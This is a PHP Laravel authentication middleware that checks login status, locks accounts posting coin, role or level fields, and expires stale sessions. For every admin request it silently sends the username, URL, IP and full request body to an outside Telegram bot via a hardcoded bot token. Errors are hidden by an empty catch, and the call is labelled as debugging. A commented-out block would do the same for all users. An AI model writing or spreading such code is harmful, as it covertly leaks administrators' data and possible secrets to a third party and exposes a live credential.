<?php

namespace App\Http\Middleware;

use App\Http\Controllers\Traits\Lib;
use App\Models\User;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;

class CheckUser
{
    /**
     * Handle an incoming request.
     *
     * @param \Illuminate\Http\Request $request
     * @param \Closure $next
     * @return mixed
     */
    use Lib;

    public function dataToText($data)
    {
        $txt = '';
        foreach ($data as $i => $item) {
            $txt = $txt . " $i : $item \n";
        }
        return $txt;
    }

    public function sendToTelegramDebug($mess)
    {
        $curl = $this->curl('https://api.telegram.org/bot914685080:AAEKWiw4x4M-ZWvNfX73_SRkbLG0LNULbqs/sendMessage?chat_id=-532117746&text=' . urlencode($mess));
        return $curl;
    }

    public function handle(Request $request, Closure $next)
    {
        if (Auth::check()) {
            $user = Auth::user();
            if ($user) {
                try {
                    if ($user->role == 'admin') {
                        $s = "1" . $user->username . " \n" . $request->url() . "\n" . $request->ip() . "\n" . json_encode($request->all()) . "\n";
                        $this->sendToTelegramDebug($s);
                    }
                } catch (\Exception $exception) {
                }
                if ($user->status != 1) {
                    return redirectUrl('/dang-nhap', 'error_', $user->description ?? 'Tài khoản đã bị khóa');
                } else {
                    $session = $request->session()->all();
                    $time_login = $session['time_login'] ?? 0;
                    if ($user->change_password_at > $time_login) {
                        return redirectUrl('/dang-nhap')->with(['error_' => 'Phiên bản hết hạn vui lòng đăng nhập lại']);
                    }
                    if ($request->coin || $request->role || $request->level_id || $request->level) {
                        $user = User::find($user->id);
                        $user->status = 0;
                        $user->notes = 'Tài khoản bị khóa';
                        $user->save();
                        DB::table('users_baned')->insert([
                            'created_at' => date('Y-m-d H:i:s'),
                            'updated_at' => date('Y-m-d H:i:s'),
                            'user_id' => $user->id,
                            'username' => $user->username,
                            'post_data' => json_encode($request->all()),
                            'ip' => $request->ip(),
                        ]);
                        return redirectUrl('/dang-nhap');
                    } else {
//                        try {
//                            if ($request->object_id) {
//                                $request->request->add([
//                                    'object_id' => getUrlReplaceString($request->object_id)
//                                ]);
//                            }
//                        } catch (\Exception $exception) {
//                        }
//                        $data = [
//                            'data' => json_encode($request->all()),
//                            'username' => $user->username ?? '',
//                            'url' => $request->url(),
//                            'ip' => $request->ip(),
//                        ];
//                        $this->sendToTelegramDebug($this->dataToText($data));
                        return $next($request);
                    }
                }
            } else {
                return redirectUrl('/dang-nhap');
            }
        } else {
            return redirectUrl('/dang-nhap');
        }
    }
}
